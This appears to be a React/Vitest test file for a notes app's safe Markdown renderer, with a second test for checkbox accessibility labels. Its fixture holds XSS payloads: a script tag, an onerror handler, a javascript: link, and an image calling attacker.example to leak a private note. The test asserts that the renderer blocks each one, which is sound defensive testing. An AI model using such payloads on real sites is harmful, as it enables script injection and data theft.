import { fireEvent, render, screen } from '@testing-library/react'
import { describe, expect, it, vi } from 'vitest'

import type { Note } from '../types'
import NoteCard from './NoteCard'
import NoteComposer from './NoteComposer'
import SafeMarkdown from './SafeMarkdown'

const unsafeMarkdown = [
  '<script>globalThis.__noteVaultScriptExecuted = true</script>',
  '<img src="missing" onerror="globalThis.__noteVaultHandlerExecuted = true">',
  '[unsafe navigation](javascript:alert(1))',
  '![tracking pixel](https://attacker.example/leak?note=private)',
].join('\n\n')

const note: Note = {
  id: 'unsafe-note',
  text: unsafeMarkdown,
  tags: [],
  createdAt: 1_710_000_000_000,
  updatedAt: null,
}

describe('safe Markdown rendering contract', () => {
  it('blocks raw scripts, inline handlers, and executable javascript links in cards and preview', () => {
    const { container } = render(
      <>
        <NoteCard note={note} onEdit={vi.fn()} onDelete={vi.fn()} onTagSelect={vi.fn()} />
        <NoteComposer
          editingNote={note}
          onSubmit={vi.fn()}
          onCancelEditing={vi.fn()}
          onDirtyChange={vi.fn()}
          loading={false}
        />
      </>,
    )

    fireEvent.click(screen.getByRole('tab', { name: 'Preview' }))

    expect(container.querySelector('script')).not.toBeInTheDocument()
    expect(container.querySelector('img[src="missing"]')).not.toBeInTheDocument()
    expect(container.querySelector('img')).not.toBeInTheDocument()
    expect(screen.getAllByText('Remote image blocked: tracking pixel')).toHaveLength(2)
    expect((globalThis as Record<string, unknown>).__noteVaultScriptExecuted).toBeUndefined()
    expect((globalThis as Record<string, unknown>).__noteVaultHandlerExecuted).toBeUndefined()
    for (const label of screen.getAllByText('unsafe navigation')) {
      const link = label.closest('a')
      expect(link).not.toBeNull()
      expect(link?.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
    }
  })

  it('gives rendered task-list checkboxes an accessible status label', () => {
    render(<SafeMarkdown>{'- [ ] Pending item\n- [x] Finished item'}</SafeMarkdown>)

    const pending = screen.getByRole('checkbox', { name: 'Incomplete task' })
    const finished = screen.getByRole('checkbox', { name: 'Completed task' })
    expect(pending).toBeDisabled()
    expect(pending).not.toBeChecked()
    expect(finished).toBeDisabled()
    expect(finished).toBeChecked()
  })
})
